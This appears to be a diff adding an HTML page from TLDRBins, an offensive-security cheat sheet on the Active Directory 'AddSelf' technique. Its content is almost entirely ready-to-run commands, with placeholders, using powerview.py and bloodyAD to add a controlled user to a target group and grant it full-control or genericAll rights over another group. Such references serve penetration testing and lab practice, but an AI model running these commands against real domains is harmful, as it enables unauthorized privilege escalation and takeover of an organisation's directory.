@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>AddSelf | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/addself/">
+      <span>AddSelf</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@addself/">Addself</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@powerview/">Powerview</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@bloodad/">BloodAD</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="addself-from-linux">AddSelf (From Linux)</h3>
+<h4 id="powerviewpy">powerview.py</h4>
+<p><a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect</span>
+</span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> powerview &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add self to group</span>
+</span></span><span class="line"><span class="cl">Add-DomainGroupMember -Identity &lt;TARGET_GROUP&gt; -Members &lt;USERNAME&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
+</span></span><span class="line"><span class="cl">Get-DomainGroupMember -Identity &lt;TARGET_GROUP&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Exit and login to make changes first</span>
+</span></span><span class="line"><span class="cl">Add-DomainObjectAcl -TargetIdentity &lt;ANOTHER_GROUP&gt; -PrincipalIdentity &lt;USERNAME&gt; -Rights fullcontrol
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
+</span></span><span class="line"><span class="cl">Get-DomainObjectAcl -Identity &lt;TARGET_USER_IN_ANOTHER_GROUP&gt; -Where <span class="s2">&#34;SecurityIdentifier contains &lt;USERNAME&gt;&#34;</span>
+</span></span></code></pre></div><h4 id="bloodad">bloodAD</h4>
+<p><a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; add groupMember &lt;TARGET_GROUP&gt; &lt;USERNAME&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># After getting full control of target group (e.g. TARGET_GROUP has genericall over ANOTHER_GROUP)</span>
+</span></span><span class="line"><span class="cl">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; add genericAll <span class="s1">&#39;OU=&lt;ANOTHER_GROUP&gt;,DC=EXAMPLE,DC=COM&#39;</span> &lt;USERNAME&gt;
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
